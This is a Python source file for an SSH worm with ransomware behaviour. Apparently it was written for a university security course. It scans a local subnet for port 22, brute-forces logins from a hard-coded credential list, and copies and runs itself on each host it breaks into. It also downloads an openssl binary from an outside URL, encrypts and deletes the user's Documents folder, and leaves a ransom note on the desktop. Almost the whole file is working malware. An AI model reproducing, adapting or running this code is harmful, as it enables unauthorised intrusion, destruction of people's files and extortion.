import paramiko
import sys
import nmap
import urllib
import socket
from subprocess import call
import tarfile
from time import sleep
from subprocess import Popen
import os
import shutil


# File marking the presence of a worm in a system
INFECTION_MARKER = "/tmp/infectionMarker_extW_python.txt"
  
  
# List of credentials for Dictionary Attack
DICTIONARYATTACK_LIST = {
        'crazy': 'things',
        'nsf': '456',
        'security': 'important',
        'ubuntu': '123456'
        }
ATTACKER_IP = "192.168.1.4"
  
#############################################
#Creates a marker file on the target system
#############################################
def markInfected():
    marker = open(INFECTION_MARKER, "w")
    marker.write("I have infected your system")
    marker.close()
  
  
#######################################################
#Checks if target system is infected
#@return - True if System is infected; False otherwise
#@param - sshC : Handle for ssh Connection
#######################################################
def isInfected(sshC):
    infected = False
  
    try:
        sftpClient = sshC.open_sftp()
        sftpClient.stat(INFECTION_MARKER)
        infected = True
          
    except Exception, e:
	print("System is not infected")
	infected = False   
  
    return infected   
      
###########################################
#Returns IP of the current System
###########################################
def getMyIP():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('4.2.2.2', 80))
        return s.getsockname()[0]
 
  
##########################################################
#Scans the Network to check Live hosts on Port 22
#@return - a list of all IP addresses on the same network
###########################################################
def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()
    portScanner.scan('192.168.1.0/24', arguments = '-p 22 --open')
    hostInfo = portScanner.all_hosts()
    liveHosts = []
    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host)
    print("My IP is: "+ getMyIP())
    liveHosts.remove(getMyIP())
    return liveHosts
  
#########################################################
#Removes all the worm traces from the remote host
########################################################
def cleanTraces():
    try:
	os.remove("/tmp/openssl")
	os.remove("/tmp/DocumentsDir.tar.enc")
	os.remove("/tmp/DocumentsDir.tar")
	os.remove("/tmp/extorter_worm.py")
	shutil.rmtree("/home/ubuntu/Documents/") 
	print("Cleaned up all traces")
    except:
	print("Files does not exist")

############################################
#Exploits the target system
##########################################
def launchAttack(ssh):
    print("Expoiting Target System")
    sftpClient = ssh.open_sftp()
    try:
        sftpClient.put("/tmp/extorter_worm.py","/tmp/extorter_worm.py")
        ssh.exec_command("chmod a+x /tmp/extorter_worm.py")
	ssh.exec_command("nohup python -u /tmp/extorter_worm.py > /tmp/worm.output &")
	print("Copied and executed worm into the system...")
    except Exception, e:
	print("Problem in Execution:", e) 
     
 
##############################################
#Tries login with the Target System
#@param hostIP - IP of target system
#@param userName - the username
#@param passWord - the password
#@return - ssh
#############################################
def attackSystem(hostIP, userName, passWord):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostIP, username = userName, password = passWord)
    return ssh
 
 
 
 
#########################################################################
#Tries to find correct Credentails in the available Dictionary
#@param - hostIp - IP of a client is sent ot test if login is sucessful
#@return - return sshConnection handle if Successful Login else,
#returns False
#########################################################################
def checkCredentials(hostIp):
    ssh = False
      
    for k in DICTIONARYATTACK_LIST.keys():
        try:
            ssh = attackSystem(hostIp, k, DICTIONARYATTACK_LIST[k])
            if ssh:
                return ssh
        except:
            pass   
    print("Could not login to the system")
    return ssh
 

##############################################
#Downlaods openSSL and extortion note files
##############################################
def downloadFiles():
    try:
	    urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")
	    print("Downloaded the OpenSSL file")
	    Popen(["chmod", "a+x", "./openssl"])
    except Exception, e:
	    print("Problem in Execution:", e) 

###############################################
#Create tar of the /home/ubuntu/Documens Dir
###############################################
def createTarAndEncrypt():
    try:
	    os.chdir("/tmp/")
	    tar = tarfile.open("DocumentsDir.tar", "w:gz")        
	    tar.add('/home/ubuntu/Documents/')
	    tar.close()
	    print("Finished tar of Documents folder")

	    #Encrypt tar file
	    Popen(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "DocumentsDir.tar", "-out", "DocumentsDir.tar.enc", "-k", "-cs456worm"])
	    print("Created Encryption File")
    except Exception, e:
	print("Problem in Execution:", e) 

 
def leaveNote():
    marker = open("/home/ubuntu/Desktop/SystemCompromised.txt", "w")
    marker.write("We have deleted the Documents Folder. An encrypted version is placed on your Desktop. You will have to purchase the encrytpion key from us !!!")
    marker.close()    
 
##############################################################
#This is start of the replicator worm
##############################################################
         
print("Started infecting the network .....")
  
#Get all hosts in the network
discoveredHosts = getHostsOnTheSameNetwork()
markInfected()
myIp = getMyIP()


#######################################################################################
#1. Download Open SSL program
#2. Create tar and encrypt the '/home/cpsc/Documents' folder
#3. Delete 'home/cpsc/Documents' folder
#4. Downlaod an image file and set it as desktop background - Note on users Desktop
#######################################################################################
if(cmp(myIp, ATTACKER_IP) != 0):
    try:
        print("In the function")
        os.chdir("/tmp/")
        downloadFiles()
        createTarAndEncrypt() 
        leaveNote()
	print(os.getcwd())
	Popen(["chmod", "a+r", "/tmp/DocumentsDir.tar.enc"])
	shutil.copy("/tmp/DocumentsDir.tar.enc", "/home/ubuntu/Desktop/")   
	print("Copied Encrypted file to Desktop")
    except Exception, e:
	print("Problem in Execution:", e) 

 
for host in discoveredHosts:
    print(host + " under Observation ...")
    ssh = None
    try:
        ssh = checkCredentials(host)
        if ssh:
            print("Successfully cracked Username and password of "+host)
            if not isInfected(ssh):
                launchAttack(ssh)
                ssh.close()
                break
            else:
                print(host + " is already infected")
    except socket.error:
        print("System no longer Up !")
    except paramiko.ssh_exception.AuthenticationException:
        print("Wrong Credentials")
    print("---------------------")

if(cmp(myIp, ATTACKER_IP) != 0):
    try: 
        cleanTraces() 
    except Exception, e:
	print("Problem in Execution:", e)  
    print("I am done now !!")
